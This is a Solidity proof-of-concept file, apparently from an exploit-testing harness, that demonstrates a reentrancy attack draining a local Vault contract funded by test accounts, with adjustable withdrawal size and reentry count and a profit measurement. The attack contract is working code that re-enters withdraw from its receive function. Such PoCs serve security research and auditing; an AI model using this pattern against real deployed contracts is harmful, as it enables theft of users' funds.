// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Vault} from "../src/Vault.sol";

/// @notice Attack contract: deposits, then withdraws in chunks and re-enters `withdraw` from
///         `receive` while the vault still holds ether.
contract ReentrantWithdrawer {
    Vault private immutable vault;
    address private immutable owner;
    uint256 private chunk;
    uint256 private reentriesLeft;

    constructor(Vault vault_, address owner_) {
        vault = vault_;
        owner = owner_;
    }

    function attack(uint256 chunk_, uint256 reentries) external payable {
        require(msg.sender == owner, "not owner");
        chunk = chunk_;
        reentriesLeft = reentries;
        vault.deposit{value: msg.value}();
        vault.withdraw(chunk_);

        // Take back whatever the vault still credits, then hand everything to the owner.
        reentriesLeft = 0;
        uint256 credited = vault.balanceOf(address(this));
        if (credited > 0) vault.withdraw(credited);
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "payout failed");
    }

    receive() external payable {
        if (reentriesLeft > 0 && address(vault).balance >= chunk) {
            reentriesLeft -= 1;
            vault.withdraw(chunk);
        }
    }
}

/// @notice Single-function reentrancy: `withdraw` sends ether before it reduces the balance.
/// Knobs:
///   0 `chunk_bps`  size of each withdrawal, in basis points of the attacker's deposit;
///   1 `reentries`  how many times `receive` re-enters `withdraw`.
/// The attacker deposits its whole starting balance.
contract VaultReentrancyPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    Vault internal vault;

    function setUpTarget() internal override {
        vault = new Vault();
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        vm.deal(alice, 6 ether);
        vm.deal(bob, 4 ether);
        vm.prank(alice);
        vault.deposit{value: 6 ether}();
        vm.prank(bob);
        vault.deposit{value: 4 ether}();

        declareAttackerBalance(1 ether, 0.01 ether, 10 ether);
        declareKnob(0, "chunk_bps", BPS, 1, BPS);
        declareKnob(1, "reentries", 5, 1, 10);
    }

    function exploit() internal override {
        uint256 balanceBefore = attacker.balance;
        uint256 chunk = balanceBefore * knob(0) / BPS;

        vm.startPrank(attacker);
        ReentrantWithdrawer withdrawer = new ReentrantWithdrawer(vault, attacker);
        withdrawer.attack{value: balanceBefore}(chunk, knob(1));
        vm.stopPrank();

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
